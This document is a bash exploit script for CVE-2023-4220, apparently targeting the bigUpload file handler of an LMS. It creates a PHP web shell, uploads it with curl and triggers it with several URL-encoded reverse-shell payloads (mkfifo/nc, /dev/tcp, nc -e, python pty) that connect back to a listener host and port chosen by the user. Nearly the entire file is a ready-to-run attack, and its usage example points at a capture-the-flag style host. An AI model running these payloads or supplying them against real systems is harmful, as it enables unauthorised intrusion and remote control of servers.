#!/bin/bash

# check the number of options (ReverseShell)

if [ $# -lt 5 ] || [ $# == "-h" ] || [ $# == "-help"  ]
then
	echo ""
	echo -e "\e[32mUsage for RevShell: ./cve-2023-4220.sh <Target-URL> <Target-Port> <Local-HOST> <Local-IP> <Payload>\e[0m"
	echo ""
	echo -e "\e[32mExample: ./cve-2023-4220.sh lms.test.htb 80 10.10.14.14 80 1\e[0m"
	echo ""
	echo -e "\e[34mPayload: 1 == rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.10.10%209001%20%3E%2Ftmp%2Ff\e[0m"
	echo ""
	echo -e "\e[34mPayload: 2 == sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F9001%200%3E%261\e[0m"
	echo ""
	echo -e "\e[34mPayload: 3 == nc%2010.10.10.10%209001%20-e%20sh\e[0m"
	echo ""
	echo -e "\e[34mPayload: 4 == python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.10.10%22%2C9001%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27\e[0m"
	echo ""
	echo -e "\e[31mPayload: 5 == Enter own Payload:\e[0m"

fi

# set variables

Target_URL="$1"
Target_PORT="$2"
Local_HOST="$3"
Local_PORT="$4"
Payload_User="$5"

# Exec Exploit with custom-payload

if [ "$Payload_User" == 5 ]
then
	echo ""
	echo -e "\e[32mEnter Payload: \e[0m"
	read Custom_Payload

	echo ""
	echo -e "\e[31m-------------------------------------\e[0m"
	echo -e "\e[31mExploit: cve-2023-4220.sh $Target_URL $Target_PORT $Local_HOST $Local_PORT $Custom_Payload\e[0m"
	echo -e "\e[31m-------------------------------------\e[0m"
	echo -e "\e[31mCreate shell.php\e[0m"
	echo ""
	echo '<?php system($_GET["cmd"]);  ?>'
	echo ""
	echo '<?php system($_GET["cmd"]);  ?>' > shell.php
	echo -e "\e[31mUpload shell.php\e[0m"
	echo ""
	curl -F 'bigUploadFile=@shell.php' "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
	echo -e "\e[31m\n\nTrigger shell.php\e[0m"
	curl "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/files/shell.php?cmd=$Custom_Payload"
	echo ""
	echo -e "\e[31mCheck listener\e[0m"

elif [ "$Payload_User" == 1 ]
then
        echo ""
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mExploit: cve-2023-4220.sh $Target_URL $Target_PORT $Local_HOST $Local_PORT 1\e[0m"
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mCreate shell.php\e[0m"
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>'
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>' > shell.php
        echo -e "\e[31mUpload shell.php\e[0m"
        echo ""
        curl -F 'bigUploadFile=@shell.php' "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
        echo -e "\e[31m\n\nTrigger shell.php\e[0m"
        curl "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/files/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20$Local_HOST%20$Local_PORT%20%3E%2Ftmp%2Ff"
        echo ""
        echo -e "\e[31mCheck listener\e[0m"

elif [ "$Payload_User" == 2 ]
then
        echo ""
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mExploit: cve-2023-4220.sh $Target_URL $Target_PORT $Local_HOST $Local_PORT 1\e[0m"
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mCreate shell.php\e[0m"
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>'
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>' > shell.php
        echo -e "\e[31mUpload shell.php\e[0m"
        echo ""
        curl -F 'bigUploadFile=@shell.php' "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
        echo -e "\e[31m\n\nTrigger shell.php\e[0m"
        curl "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/files/shell.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$Local_HOST%2F$Local_PORT%200%3E%261"
        echo ""
        echo -e "\e[31mCheck listener\e[0m"

elif [ "$Payload_User" == 3 ]
then
        echo ""
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mExploit: cve-2023-4220.sh $Target_URL $Target_PORT $Local_HOST $Local_PORT 1\e[0m"
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mCreate shell.php\e[0m"
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>'
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>' > shell.php
        echo -e "\e[31mUpload shell.php\e[0m"
        echo ""
        curl -F 'bigUploadFile=@shell.php' "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
        echo -e "\e[31m\n\nTrigger shell.php\e[0m"
        curl "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/files/shell.php?cmd=nc%20$Local_HOST%20$Local_PORT%20-e%20sh"
        echo ""
        echo -e "\e[31mCheck listener\e[0m"

elif [ "$Payload_User" == 4 ]
then
        echo ""
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mExploit: cve-2023-4220.sh $Target_URL $Target_PORT $Local_HOST $Local_PORT 1\e[0m"
        echo -e "\e[31m-------------------------------------\e[0m"
        echo -e "\e[31mCreate shell.php\e[0m"
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>'
        echo ""
        echo '<?php system($_GET["cmd"]);  ?>' > shell.php
        echo -e "\e[31mUpload shell.php\e[0m"
        echo ""
        curl -F 'bigUploadFile=@shell.php' "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
        echo -e "\e[31m\n\nTrigger shell.php\e[0m"
        curl "http://$Target_URL:$Target_PORT/main/inc/lib/javascript/bigupload/files/shell.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22$Local_HOST%22%2C$Local_PORT%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27"
        echo ""
        echo -e "\e[31mCheck listener\e[0m"

fi
